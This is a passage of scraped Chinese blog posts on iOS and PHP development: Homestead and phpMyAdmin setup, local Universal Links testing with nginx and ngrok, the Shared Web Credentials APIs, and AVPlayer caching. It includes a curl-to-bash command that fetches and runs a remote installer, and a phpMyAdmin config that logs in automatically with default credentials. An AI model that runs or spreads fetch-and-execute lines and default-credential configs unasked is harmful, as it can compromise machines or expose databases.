$cfg['Servers'][$i]['navigationhiding'] = 'pma__navigationhiding';// $cfg['Servers'][$i]['savedsearches'] = 'pma__savedsearches';// $cfg['Servers'][$i]['central_columns'] = 'pma__central_columns';// $cfg['Servers'][$i]['designer_settings'] = 'pma__designer_settings';// $cfg['Servers'][$i]['export_templates'] = 'pma__export_templates';/** * End of servers configuration *//** * Directories for saving/loading files from server */$cfg['UploadDir'] = '';$cfg['SaveDir'] = '';/** * Whether to display icons or text or both icons and text in table row * action segment. Value can be either of 'icons', 'text' or 'both'. * default = 'both' *///$cfg['RowActionType'] = 'icons';/** * Defines whether a user should be displayed a \"show all (records)\" * button in browse mode or not. * default = false *///$cfg['ShowAll'] = true;/** * Number of rows displayed when browsing a result set. If the result * set contains more rows, \"Previous\" and \"Next\". * Possible values: 25, 50, 100, 250, 500 * default = 25 *///$cfg['MaxRows'] = 50;/** * Disallow editing of binary fields * valid values are: * false allow editing * 'blob' allow editing except for BLOB fields * 'noblob' disallow editing except for BLOB fields * 'all' disallow editing * default = 'blob' *///$cfg['ProtectBinary'] = false;/** * Default language to use, if not browser-defined or user-defined * (you find all languages in the locale folder) * uncomment the desired line: * default = 'en' *///$cfg['DefaultLang'] = 'en';//$cfg['DefaultLang'] = 'de';/** * How many columns should be used for table display of a database? * (a value larger than 1 results in some information being hidden) * default = 1 *///$cfg['PropertiesNumColumns'] = 2;/** * Set to true if you want DB-based query history.If false, this utilizes * JS-routines to display query history (lost by window close) * * This requires configuration storage enabled, see above. * default = false *///$cfg['QueryHistoryDB'] = true;/** * When using DB-based query history, how many entries should be kept? * default = 25 *///$cfg['QueryHistoryMax'] = 100;/** * Whether or not to query the user before sending the error report to * the phpMyAdmin team when a JavaScript error occurs * * Available options * ('ask' | 'always' | 'never') * default = 'ask' *///$cfg['SendErrorReports'] = 'always';/** * You can find more configuration options in the documentation * in the doc/ folder or at &lt;https://docs.phpmyadmin.net/&gt;. */主要是新增修改這三項設定：$cfg['Servers'][$i]['auth_type'] = 'config';$cfg['Servers'][$i]['user'] = 'homestead'; homestead 預設 mysql 帳號密碼 homestead / secret 。配置 Homestead 設定用編輯器打開 ~/Homestead/Homestead.yaml 設定檔。---ip: \"192.168.10.10\"memory: 2048cpus: 2provider: virtualboxauthorize: ~/.ssh/id_rsa.pubkeys: - ~/.ssh/id_rsafolders: - map: ~/Projects/Web to: /home/vagrant/code - map: ~/Homestead/phpMyAdmin to: /home/vagrant/phpMyAdminsites: - map: phpMyAdmin.test to: /home/vagrant/phpMyAdmindatabases: - homesteadfeatures: - mysql: false - mariadb: false - postgresql: false - ohmyzsh: false - webdriver: false#services:# - enabled:# - \"postgresql@12-main\"# - disabled:# - \"postgresql@11-main\"# ports:# - send: 50000# to: 5000# - send: 7777# to: 777# protocol: udp IP : 預設是 192.168.10.10 可改可不 provider ：預設是 virtualbox ，如果用 Parallels 才需要改 folders: 新增- map: ~/Homestead/phpMyAdminto: /home/vagrant/phpMyAdmin sites: 新增- map: phpMyAdmin.test to: /home/vagrant/phpMyAdmin如果已經有 Laravel 專案也可以一併在此新增，例如我專案都放在 ~/Projects/Web 下，所以我也先把目錄映射加上去。sites 是設定本機虛擬網域與目錄映射，我們還需要修改本地 Hosts 檔增網域虛擬機映射：使用 Finder -&gt; Go -&gt; /etc/hosts ，找到 hosts 檔案；複製到桌面（因無法直接修改） 網域名稱可隨意自訂，反正只有自己本機可以 Access。打開複製出來的 Hosts 檔案，增加 sites 紀錄：&lt;homestead IP 位置&gt; &lt;網域名稱&gt;修改好之後儲存，然後再剪下貼回 /etc/hosts ，覆蓋掉即可。安裝&amp;啟動 Homestead Virtual Machinecd ~/Homesteadvagrant up --provision ⚠️請注意 ，如果沒加 --provision 則設定檔不會更新，輸入網址會出現 no input file specified 錯誤。第一次啟動，需要下載 Homestead 環境包，需要較長的時間。如果沒有出現特別的錯誤即表示啟動成功，可以下：vagrant sshssh 進入虛擬機。檢查 phpMyAdmin 是否正確連線前往 http://phpmyadmin.test/ 檢查是否正常開啟。成功！我們遇到要操作資料庫的地方，直接進來這邊修改即可。新建 Laravel 專案如果你有已存在的專案，到這一步已經可以從瀏覽器在本地運行了，如果沒有，這邊補充一下新建 Laravel 專案的方式。~/Homesteadvagrant sshvagrant ssh 進 VM，然後 cd 到 code 目錄：cd ./code下 laravel new 專案名稱，建立 Laravel 專案：(以 blog 為例)laravel new blogblog 專案建立成功！再來我們要將專案設定本機器存取測試網域：回頭打開編輯 ~/Homestead/Homestead.yaml 設定檔。在 sites 中新增一筆紀錄：sites: - map: myblog.test to: /home/vagrant/code/blog/public記得 hosts 也要加上對應紀錄：192.168.10.10. myblog.test最後重啟 homestead：vagrant reload --provision在瀏覽器輸入 http://myblog.test 測試是否正確建立＆運行：完成！補充 — Mac 安裝 Composer雖然已經有用 Homestead 可以不需要另外裝 Composer，但考慮到有的 PHP 專案並不一定使用 Laravel 所以還是要在本機上安裝 Composer。 Composer複製下載區段的指令，將 php composer-setup.php 替換為：php composer-setup.php - install-dir=/usr/local/bin - filename=composerComposer v2.0.9 範例:php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"php -r \"if (hash_file('sha384', 'composer-setup.php') === '756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"php composer-setup.php --install-dir=/usr/local/bin --filename=composerphp -r \"unlink('composer-setup.php');\"並依序在 terminal 輸入指令。 ⚠️請注意 ，不要直接複製使用以上範例，因為隨著 Composer 版本更新 hash check 碼也會跟著變。輸入 composer -V 確認版本＆安裝成功！參考資料 https://laravel.com/docs/8.x/homestead https://getcomposer.org/download/有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,247 Total Views Last Statistics Date: 2025-01-19 | 1,245 Views on Medium. " }, { "title": "Universal Links 新鮮事", "url": "/posts/12c5026da33d/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, universal-links, app-store, deeplink", "date": "2021-02-04 11:57:25 +0800", "snippet": "Universal Links 新鮮事iOS 13, iOS 14 Universal Links 新鮮事＆建立本地測試環境Photo by NASA前言對於一個有網站又有 APP 的服務， Universal Links 的功能對於使用者體驗來說無比的重要，能達到 Web 與 APP 之間的無縫接軌；但一直以來都只有簡單設置，沒有太多的著墨；前陣子剛好又遇到花了點時間研究了一下，把一些有趣...", "content": "Universal Links 新鮮事iOS 13, iOS 14 Universal Links 新鮮事＆建立本地測試環境Photo by NASA前言對於一個有網站又有 APP 的服務， Universal Links 的功能對於使用者體驗來說無比的重要，能達到 Web 與 APP 之間的無縫接軌；但一直以來都只有簡單設置，沒有太多的著墨；前陣子剛好又遇到花了點時間研究了一下，把一些有趣的事記錄下來。常見考量經手過的服務，對於實作 Universal Links 的考量都是 APP 上並沒有實作完整的網站功能，Universal Links 認的是域名，只要域名匹配到就會開啟 APP；關於這個問題可以下 NOT 排除 APP 上沒有相應功能的網址，若網站服務網址很極端，那乾脆新建一個 subdomain 用來做 Universal Links。apple-app-site-association 何時更新？ iOS &lt; 14，APP 在第一次安裝、更新時會去詢問 Universal Links 網站的 apple-app-site-association。 iOS ≥ 14 ，則是由 Apple CDN 做快取定期更新 Universal Links 網站的 apple-app-site-association；APP 在第一次安裝、更新時會去跟 Apple CDN 拿取；但這邊就會有個問題，Apple CDN 的 apple-app-site-association 可能還是舊的。關於 Apple CDN 的更新機制，查了一下文件，沒有提到；查了下 討論 ，官方也只回應「會定期更新」細節之後會發佈在文件…但至今依然還沒看到。 我自己覺得應該最慢 48 小時，就會更新吧。。。所以下次有更改到 apple-app-site-association 的話建議在 APP 上架更新前幾天就先改好 apple-app-site-association 上線。apple-app-site-association Apple CDN 確認：Headers: HOST=app-site-association.cdn-apple.comGET https://app-site-association.cdn-apple.com/a/v1/你的網域可以取得當前 Apple CDN 上的版本長怎樣。（記得加上 Request Header Host=https://app-site-association.cdn-apple.com/ ）iOS ≥ 14 Debug因前述的 CDN 問題，那我們在開發階段該如何 debug 呢？還好這部分蘋果有給解決方法，不然沒辦法即時更新真的要吐血了；我們只需要再 applinks:domain.com 加上 ?mode=developer 即可，另外還有 managed(for 企業內部 APP) , or developer+managed 模式可設定。加上 mode=developer 後，APP 在模擬器上每次 Build &amp; Ｒun 時都會直接跟網站拿最新的 app-site-association 來用。如果要 Build &amp; Run 在實機則要先去「設定」-&gt;「開發者」-&gt; 打開「Associated Domains Development」選項即可。 ⚠️ 這邊有個坑 ，app-site-association 可以放在網站根目錄或是 ./.well-known 目錄下；但在 mode=developer 下他只會問 ./.well-known/app-site-association ，害我以為怎麼沒效。開發測試如果是 iOS &lt;14 記得有更改過 app-site-association 的話要刪掉再重 Build &amp; Run APP 才會去抓最新的回來，iOS ≥ 14 請參考前述方法加上 mode=developer。app-site-association 內容的修改，好一點的話可以自行修改伺服器上的檔；但對於有時候碰不到伺服器端的我們來說，如果要做 universal links 的測試會非常的麻煩，要不停的麻煩後端同事幫忙，變成要很確定 app-site-association 內容後一次上線，一直改來改去會把同事逼瘋。在本地建一個模擬環境為了解決上述問題，我們可以在本地起一個小服務。首先在 mac 上安裝 nginx：brew install nginx如果沒安裝過 brew 可先安裝：/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"安裝完 nginx 後，前往 /usr/local/etc/nginx/ 打開編輯 nginx.conf 檔案：...略server { listen 8080; server_name localhost;#charset koi8-r;#access_log logs/host.access.log main;location / { root /Users/zhgchgli/Documents; index index.html index.htm; }...略大概在第 44 行的位置將 location / 裡的 root 換成你想要的目錄位置（這邊以 Documents 為例）。 listen on 8080 port ，如果沒有衝突則不需要修改。儲存修改完後，下指令啟動 nginx：nginx若要停止時，則下：nginx -s stop停止。如果有更改 nginx.conf 記得要下：nginx -s reload重新啟用服務。建立一個 ./.well-known 目錄在剛設定的 root 目錄內，並將 apple-app-site-association 檔案放到 ./.well-known 內。 ⚠️ .well-known 建立後若消失，請注意 Mac 要打開「顯示隱藏資料夾」功能：在 terminal 下：defaults write com.apple.finder AppleShowAllFiles TRUE再下 killall finder 重啟所有 finder，即可。 ⚠️ apple-app-site-association 看起來沒有副檔名，但實際還是有 .json 副檔名：在檔案上按右鍵 -&gt; 「取得資訊 Get Info」-&gt;「Name &amp; Extension」-&gt; 檢查有無副檔名＆同時可取消勾選「隱藏檔案類型 Hide extension」沒問題後，打開瀏覽器測試以下連結是否正常下載 apple-app-site-association：http://localhost:8080/.well-known/apple-app-site-association如果能正常下載代表本地環境模擬成功！ 如果出現 404/403 錯誤則請檢查 root 目錄是否正確、目錄/檔案是否有放入、apple-app-site-association 是否不小心帶了副檔名( .json)。註冊＆下載 Ngrokngrok.com解壓縮出 ngrok 執行檔進入 Dashboard 頁面 執行 Config 設定./ngrok authtoken 你的TOKEN設定好之後，下：./ngrok http 8080 因我們的 nginx 在 8080 port。啟動服務。這時候我們會看到一個服務啟動狀態視窗，可以從 Forwarding 中取的此次分配到的公開網址。 ⚠️ 每次啟動分配到的網址都會變，所以僅能作為開發測試使用。 這邊以此次分配到的網址 https://ec87f78bec0f.ngrok.io/ 為例回到瀏覽器改輸入 https://ec87f78bec0f.ngrok.io/.well-known/apple-app-site-association 看看能不能正常下載瀏覽 apple-app-site-association 檔案，如果沒問題則可繼續下一步。將 ngrok 分配到的網址輸入到 Associated Domains applinks: 設定中。記得帶上 ?mode=developer 方便我們測試。重新 Build &amp; Run APP：打開瀏覽器輸入相應的 Universal Links 測試網址（EX: https://ec87f78bec0f.ngrok.io/buy/123 ）查看效果。 頁面出現 404 不要理他，因為我們實際沒有那一頁；我們只是要測 iOS 對網址匹配的功能符不符合我們預期；如果上方有出現 「Open」代表匹配成功，另外也可以測 NOT 反向的狀況。點擊「Open」後開啟 APP -&gt; 測試成功！ 開發階段都測試 OK 後，將確認修改過之後的 apple-app-site-association 檔案再交給後端上傳到伺服器就能確保萬無一失囉～ 最後記得將 Associated Domains applinks: 改為正試機網址。另外我們也可以從 ngrok 運行狀態視窗中看到每次 APP Build &amp; Run 有沒有跟我們要 apple-app-site-association 檔案：Applinks 設定內容iOS &lt; 13 之前：設定檔較簡單，只有以下內容可設定：{ \"applinks\": { \"apps\": [], \"details\": [ { \"appID\" : \"TeamID.BundleID\", \"paths\": [ \"NOT /help/\", \"*\" ] } ] }}將 TeamID.BundleId 換成你的專案設定 (ex: TeamID = ABCD , BundleID = li.zhgchg.demoapp =&gt; ABCD.li.zhgchg.demoapp )。 如果有多個 appID 則要重複加入多組。paths 部分則為匹配規則，能支援以下幾種語法： * ：匹配 0~多個字元，ex: /home/* (home/alan…) ? ：匹配 1 個字元，ex: 201? (2010~2019) ?* ：匹配 1 個~多個字元，ex: /?* (/test、/home. . ) NOT ：反向排除，ex: NOT /help (any url but /help)更多玩法組合可自己依照實際情況決定，更多資訊可參考 官方文件 。 - 請注意，他不是 Regex，不支援任何 Regex 寫法。 - 舊版不支援 Query (?name=123)、Anchor ( #title)。 - 中文網址須先轉成 ASCII 後才能放在 paths 中 (所有url 字元均要是 ASCII)。iOS ≥ 13 之後：強化了設定檔內容的功能，多增加支援 Query/Anchor、字符集、編碼處理。\"applinks\": { \"details\": [ { \"appIDs\": [ \"TeamID.BundleID\" ], \"components\": [ { \"#\": \"no_universal_links\", \"exclude\": true, \"comment\": \"Matches any URL whose fragment equals no_universal_links and instructs the system not to open it as a universal link\" }, { \"/\": \"/buy/*\", \"comment\": \"Matches any URL whose path starts with /buy/\" }, { \"/\": \"/help/website/*\", \"exclude\": true, \"comment\": \"Matches any URL whose path starts with /help/website/ and instructs the system not to open it as a universal link\" }, { \"/\": \"/help/*\", \"?\": { \"articleNumber\": \"????\" }, \"comment\": \"Matches any URL whose path starts with /help/ and that has a query item with name 'articleNumber' and a value of exactly 4 characters\" } ] } ]}轉貼自官方文件，可以看到格式有所改變。appIDs 為陣列，可放入多組 appID，這樣就不用像以前一樣只能整個區塊重複輸入。 WWDC 有提到與舊版兼容， 當 iOS ≥ 13 有讀到新的格式就會忽略舊的 paths 。匹配規則改放在 components 中；支援 3 種類型： / ： URL ? ：Query，ex: ?name=123&amp;place=tw # ：Anchor，ex: #title並且可以搭配使用，假設今天 /user/?id=100#detail 才需要跳到 APP 則可寫成：{ \"/\": \"/user/*\", \"?\": { \"id\": \"*\" }, \"#\": \"detail\"}其中匹配語法同原本語法，也是支援 * ? ?* 。新增 comment 註解欄位，可輸入註解方便辨識。（但請注意這是公開的，別人也看得到）反向排除則改為指定 exclude: true 。新增 caseSensitive 指定功能，可指定匹配規則是否對大小寫敏感， 預設：true ，有這需求的話可以少寫許多規則。新增 percentEncoded 前面說到的，舊版需要先將網址轉為 ASCII 放到 paths 中（如果是中文字會變得很醜無法辨識）；這個參數就是是否要幫我們自動 encode， 預設是 true 。假設是中文網址就能直接放入了(ex: /客服中心 )。詳細官方文件可 參考此 。預設字符集：這算是這次更新蠻重要的功能之一，新增支援字符集。系統幫我們定義好的字符集： $(alpha) ：A-Z 和 a-z $(upper) ：A-Z $(lower) ：a-z $(alnum) ：A-Z 和 a-z 和 0–9 $(digit) ：0–9 $(xdigit) ：十六進制字符，0–9 和 a,b,c,d,e,f,A,B,C,D,E,F $(region) ：ISO 地區編碼 isoRegionCodes ，Ex: TW $(lang) ：ISO 語言編碼 isoLanguageCodes ，Ex: zh假設我們的網址有多語系，我想要支援 Universal links 時，可以這樣設定：\"components\": [ { \"/\" : \"/$(lang)-$(region)/$(food)/home\" } ]這樣不管是 /zh-TW/home 、 /en-US/home 都能支援，非常方便，不用自己寫一整排規則！自訂字符集：除了預設字符集之外，我們也能自訂字符集，增加設定檔復用、可讀性。在 applinks 中加入 substitutionVariables 即可：{ \"applinks\": { \"substitutionVariables\": { \"food\": [ \"burrito\", \"pizza\", \"sushi\", \"samosa\" ] }, \"details\": [{ \"appIDs\": [ ... ], \"components\": [ { \"/\" : \"/$(food)/\" } ] }] }}範例中自訂了一個 food 字符集，並在後續 components 中使用。以上範例可匹配 /burrito , /pizza , /sushi , /samosa 。細節可參考 此篇 官方文件。沒有靈感？如果對設定檔內容沒有靈感，可偷偷參考其他網站福的內容，只要在服務網站首頁網址加上 /app-site-association 或 /.well-known/app-site-association 即可讀取他們的設定。例如： https://www.netflix.com/apple-app-site-association補充在有使用 SceneDelegate 的情況下，open universal link 的進入點是在SceneDelegate 中：func scene(_ scene: UIScene, continue userActivity: NSUserActivity)而非 AppDelegate 的：func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([UIUserActivityRestoring]?) -&gt; Void) -&gt; Bool延伸閱讀 iOS 跨平台帳號密碼整合，加強登入體驗 iOS Deferred Deep Link 延遲深度連結實作(Swift)參考資料 What’s new in Universal Links Apple Documentation有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 14,170 Total Views Last Statistics Date: 2025-01-19 | 14,065 Views on Medium. " }, { "title": "iOS 跨平台帳號密碼整合加強登入體驗", "url": "/posts/948ed34efa09/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, password-security, web-credential, sign-in-with-apple", "date": "2021-02-02 22:13:50 +0800", "snippet": "iOS 跨平台帳號密碼整合，加強登入體驗除 Sign in with Apple 也值得加入的功能Photo by Dan Nelson功能在同時有網站又有 APP 的服務中最常遇到的問題就是使用者在網站登入註冊過，且有記憶密碼；但被引導安裝 APP 後，打開登入要從頭輸入帳號密碼非常不方便；此功能就是能將已存在在手機的帳號密碼自動帶入到與網站關聯的 APP 之中，加速使用者登入流程。效果圖...", "content": "iOS 跨平台帳號密碼整合，加強登入體驗除 Sign in with Apple 也值得加入的功能Photo by Dan Nelson功能在同時有網站又有 APP 的服務中最常遇到的問題就是使用者在網站登入註冊過，且有記憶密碼；但被引導安裝 APP 後，打開登入要從頭輸入帳號密碼非常不方便；此功能就是能將已存在在手機的帳號密碼自動帶入到與網站關聯的 APP 之中，加速使用者登入流程。效果圖不囉唆，先上完成效果圖；第一眼看到可能會以為是 iOS ≥ 11 Password AutoFill 功能；不過請您仔細看，鍵盤並沒有跳出來，而且我是點擊「選擇已存密碼」按鈕才跳出帳號密碼選擇視窗的。既然提到了 Password AutoFill 那就先讓我賣個關子，先介紹 Password AutoFill 和如何設置吧！Password AutoFill支援度：iOS ≥ 11到如今已經 iOS 14 了，這個功能已經非常常見沒什麼特別的；在 APP 中的帳號密碼登入頁，叫出鍵盤輸入時可以快速選擇網站版服務的帳號密碼，選擇後就能自動帶入，快速登入！那麼 APP 與 Web 之間是如何相認的呢？Associated Domains！我們在 APP 中指定 Associated Domains 並在網站上上傳 apple-app-site-association 檔案，兩邊就能相認。1.在專案設定中的「Signing &amp; Capabilities」-&gt; 左上「+ Capabilities」-&gt;「Associated Domains」新增 webcredentials:你的網站域名 (ex: webcredentials:google.com )。2.進入 蘋果開發者後台在「 Membership 」Tab 地方記錄下「 Team ID 」3.進入「Certificates, Identifiers &amp; Profiles」-&gt;「Identifiers」-&gt; 找到你的專案 -&gt; 打開「Associated Domains」功能APP 端設定完成！4.Web網站端設定建立一個名為「 apple-app-site-association 」的檔案(無副檔名)，使用文字編輯器編輯，並輸入以下內容：{ \"webcredentials\": { \"apps\": [ \"TeamID.BundleId\" ] }}將 TeamID.BundleId 換成你的專案設定 (ex: TeamID = ABCD , BundleID = li.zhgchg.demoapp =&gt; ABCD.li.zhgchg.demoapp )將此檔案上傳到網站 根目錄 或 /.well-known 目錄下，假設你的 webcredentials 網站域名 是設 google.com 則此檔案就要是 google.com/apple-app-site-association 或 google.com/.well-know/apple-app-site-association 有辦法存取到的。補充：Subdomains摘錄官方文件，如果是 subdomains 則都須列在 Associated Domains 之中。Web 端設定完成！補充：applinks這邊有發現如果有設過 universal link applinks ，其實不用再多加 webcredentials 部分也能有效果；但我們還是照文件來吧，難保之後不會有其他問題。回到程式Code 部分，我們只需要將 TextField 設為 ：usernameTextField.textContentType = .usernamepasswordTextField.textContentType = .password如果是新註冊，密碼確認欄位可使用：repeatPasswordTextField.textContentType = .newPassword這時候再重 Build &amp; Run APP 後，在輸入帳號時鍵盤上方就會出現同個網站下已存密碼的選項了。完成！沒出現？可能是沒打開自動填寫密碼功能（模擬器預設是關閉），請到「設定」-&gt;「密碼」-&gt;「自動填寫密碼」-&gt;打開「自動填寫密碼」。抑或是該網站沒有已存在的密碼，一樣可在「設定」-&gt;「密碼」-&gt; 右上角「+ 新增」-&gt; 新增。進入主題前菜 Password AutoFill 介紹完之後，再來進入本篇主題；如何達到效果圖中的效果呢。Shared Web Credentials始於 iOS 8.0 只是之前很少看到 APP 使用，早在 Password AutoFill 出來之前其實就能使用此 API 整合網站帳號密碼讓使用者快速選擇。Shared Web Credentials 除了能讀取帳號密碼，還能新增帳號密碼、對已存的帳號密碼進行修改、刪除。設定 ⚠️ 設定部分一樣要設好 Associated Domains，同前述 Password AutoFill 設定。 所以可以說是 Password AutoFill 功能的加強版！！因為一樣要先設好 Password AutoFill 需要的環境才能使用此「進階」功能。讀取讀取使用 SecRequestSharedWebCredential 方法進行操作：SecRequestSharedWebCredential(nil, nil) { (credentials, error) in guard error == nil else { DispatchQueue.main.async { //alert error } return } guard CFArrayGetCount(credentials) &gt; 0, let dict = unsafeBitCast(CFArrayGetValueAtIndex(credentials, 0), to: CFDictionary.self) as? Dictionary&lt;String, String&gt;, let account = dict[kSecAttrAccount as String], let password = dict[kSecSharedPassword as String] else { DispatchQueue.main.async { //alert error } return } DispatchQueue.main.async { //fill account,password to textfield }}SecRequestSharedWebCredential(fqdn, account, completionHandler) fqdn 如果有多個 webcredentials domain 可以指定某一個，或使用 null 不指定 account 指定要查某一個帳號，使用 null 不指定效果圖。（你可能有發現跟開始的效果圖不一樣） ⚠️ 因為此讀取方法已在 iOS 14 被標示 Deprecated！ ⚠️ 因為此讀取方法已在 iOS 14 被標示 Deprecated！ ⚠️ 因為此讀取方法已在 iOS 14 被標示 Deprecated！ \"Use ASAuthorizationController to make an ASAuthorizationPasswordRequest (AuthenticationServices framework)\"此方法僅適用 iOS 8 ~ iOS 14，iOS 13 之後可改用同 Sign in with Apple 的 API — 「 AuthenticationServices 」AuthenticationServices 讀取方式支援度 iOS ≥ 13import AuthenticationServicesclass ViewController: UIViewController { override func viewDidLoad() { super.viewDidLoad() //... let request: ASAuthorizationPasswordRequest = ASAuthorizationPasswordProvider().createRequest() let controller = ASAuthorizationController(authorizationRequests: [request]) controller.delegate = self controller.performRequests() //... }}extension ViewController: ASAuthorizationControllerDelegate { func authorizationController(controller: ASAuthorizationController, didCompleteWithAuthorization authorization: ASAuthorization) { if let credential = authorization.credential as? ASPasswordCredential { // fill credential.user, credential.password to textfield } // else if as? ASAuthorizationAppleIDCredential... sign in with apple } func authorizationController(controller: ASAuthorizationController, didCompleteWithError error: Error) { // alert error }}效果圖，可以看到新的做法在流程上、顯示上都能跟 Sign in with Apple 整合得更好。 ⚠️ 此登入無法取代 Sign in with Apple（兩個是不同東西）。寫入帳號密碼到「密碼」被 Deprecated 的只有讀取的部分，新增、刪除、編輯的部分都還是照舊能用。新增、刪除、編輯的部分使用 SecAddSharedWebCredential 進行操作。SecAddSharedWebCredential(domain as CFString, account as CFString, password as CFString?) { (error) in DispatchQueue.main.async { guard error == nil else { // alert error return } // alert success }}SecAddSharedWebCredential(fqdn, account, password, completionHandler) fqdn 可隨意指定要存入的 domain 不一定要在 webcredentials 中 account 指定要新增、修改、刪除的帳號 如果要刪除資料則將 password 帶入 nil 處理邏輯：- account 存在＆有帶入 password = 修改 password- account 存在＆password 帶入 nil = 從 domain 刪除 account, password- account 不存在＆有帶入 password = 新增 account, password 到 domain ⚠️ 另外也不是能讓你在背景偷修改的，每次修改都會跳出提示框提示使用者，使用者按「更新密碼」才會真的修改資料。密碼產生器最後一個小功能，密碼產生器。使用 SecCreateSharedWebCredentialPassword() 進行操作。let password = SecCreateSharedWebCredentialPassword() as String? ?? \"\"產生器產生出來的 Password 由英文大小寫及數字並使用「-」組成 (ex: Jpn-4t2-gaF-dYk)。完整測試專案下載美中不足如果有使用第三方密碼管理工具(EX: onepass、lastpass)的朋友可能會發現，如果是鍵盤的 Password AutoFill 能支援顯示&amp;輸入，但是在 AuthenticationServices 或 SecRequestSharedWebCredential 當中都沒有顯示出來；不確定有沒有辦法達成這個需求。結束感謝大家閱讀，也感謝 saiday 、街聲讓我知道有這個功能 XD。還有 XCode ≥ 12.5 模擬器新增錄影，並支援儲存成 GIF 功能太好用啦！在模擬器上按「Command」+「R」開始錄影，按一下紅點停止錄影；在右下角滑出的預覽圖上按「右鍵」-&gt;「Save as Animated GIF」即可存成 GIF 然後直接貼到文章內！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,714 Total Views Last Statistics Date: 2025-01-19 | 1,662 Views on Medium. " }, { "title": "AVPlayer 實踐本地 Cache 功能大全", "url": "/posts/6ce488898003/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, cache, avplayer, music-player-app", "date": "2021-01-31 18:41:42 +0800", "snippet": "AVPlayer 實踐本地 Cache 功能大全AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegatePhoto by Tyler Lastovich[2023/03/12] Update我將之前的實作開源了，有需求的朋友可直接使用。 客製化 Cache 策略，可以用 PINCache or 其他… ...", "content": "AVPlayer 實踐本地 Cache 功能大全AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegatePhoto by Tyler Lastovich[2023/03/12] Update我將之前的實作開源了，有需求的朋友可直接使用。 客製化 Cache 策略，可以用 PINCache or 其他… 外部只需呼叫 make AVAsset 工廠，帶入 URL，則 AVAsset 就能支援 Caching 使用 Combine 實現 Data Flow 策略 寫了一些測試前言既上一篇「 iOS HLS Cache 實踐方法探究之旅 」後已過了大半年，團隊還是一直想要實現邊播邊 Cache 功能因為對成本的影響極大；我們是音樂串流平台，如果每次播放同樣的歌曲都要重新拿整個檔案，對我們或對非吃到飽的使用者來說都很傷流量，雖然音樂檔案頂多幾 MB，但積沙成塔都是錢！另外因為 Android 那邊已經有實作邊播邊 Cache 的功能了，之前有比較過花費，Android 端上線後明顯節省了許多流量；相對更多使用者的 iOS 應該能有更好的節流體現。根據 上一篇 的經驗，如果我們要繼續使用 HLS ( .m3u8/.ts) 來達成目的；事情將會變得非常複雜甚至無法達成；我們退而求其次退回去使用 mp3 檔，這樣就能直接使用 AVAssetResourceLoaderDelegate 進行實作。目標 播放過的音樂會在本地產生 Cache 備份 播放音樂時先檢查本地有無 Cache 讀取，有則不再重伺服器要檔案 可設 Cache 策略；上限總容量，超過時開始刪除最舊的 Cache 檔案 不干涉原本 AVPlayer 播放機制（不然最快的方法就是自己先用 URLSession 把 mp3 載下來塞給 AVPlayer，但這樣就失去原本能播到哪載到哪的功能，使用者需要等待更長時間＆更消耗流量）前導知識 (1)— HTTP/1.1 Range 範圍請求、Connection Keep-AliveHTTP/1.1 Range 範圍請求首先我們要先了解在播放影片、音樂時是怎麼跟伺服器要求資料的；一般來說影片、音樂檔案都很大，不可能等到全部拿完才開始播放常見的是播到哪拿到了，只要有正在播放區段的資料就能運作。要達到這個功能的方法就是透過 HTTP/1.1 Range 只返回指定資料字節範圍的資料，例如指定 0–100 就只返回 0–100 這 100 bytes 大小的資料；透過這個方法，可以依序分段取得資料，然後再彙整再一起成完整的檔案；這個方法也能運用在檔案下載續傳功能上。如何應用？我們會先使用 HEAD 去看 Response Header 了解到伺服器是否支援 Range 範圍請求、資源總長度、檔案類型：curl -i -X HEAD http://zhgchg.li/music.mp3使用 HEAD 我們能從 Response Header 得到以下資訊： Accept-Ranges: bytes 代表伺服器支援 Range 範圍請求如果沒有 Response 這個值或是是 Accept-Ranges: none 都代表不支援 Content-Length: 資源總長度，我們要知道總長度才能去分段要資料。 Content-Type: 檔案類型，AVPlayer 播放時需要知道的資訊。但有時我們也會使用 GET Range: bytes=0–1 ，意思是我要求 0–1 範圍的資料但實際我根本不 Care 0–1是什麼內容，我只是要看 Response Header 的資訊； 原生 AVPlayer 就是使用 GET 去看，所以本篇也照舊使用 。 但比較建議使用 HEAD 去看，一方法比較正確，另一方面萬一伺服器不支援 Range 功能；用 GET 去摸就會變強迫下載完整檔案。curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–1\"使用 GET 我們能從 Response Header 得到以下資訊： Accept-Ranges: bytes 代表伺服器支援 Range 範圍請求如果沒有 Response 這個值或是是 Accept-Ranges: none 都代表不支援 Content-Range: bytes 0–1/資源總長度 ，「/」後的數字及資源總長度，我們要知道總長度才能去分段要資料。 Content-Type: 檔案類型，AVPlayer 播放時需要知道的資訊。知道伺服器支援 Range 範圍請求後，就能分段發起範圍請求：curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–100\"伺服器會返回 206 Partial Content：Content-Range: bytes 0-100/總長度Content-Length: 100...(binary content)這時我們就得到 Range 0–100 的 Data，可再繼續發新請求拿 Range 100–200. .200–300…到結束。如果拿的 Range 超過資源總長度會返回 416 Range Not Satisfiable。另外，想拿完整檔案資料除了可以請求 Range 0-總長度，也可以使用 0- 方式即可：curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–\"其他還可以同個請求要求多個 Range 資料及下條件式子，但我們用不到，詳情可 參考這 。Connection Keep-Alivehttp 1.1 預設是開啟狀態， 此特性能實時取得已下載的資料 ，例如檔案 5 mb，能 16 kb、16 kb、16 kb… 的取得，不用等到 5mb 都好才給你。Connection: Keey-Alive如果發現伺服器不支援 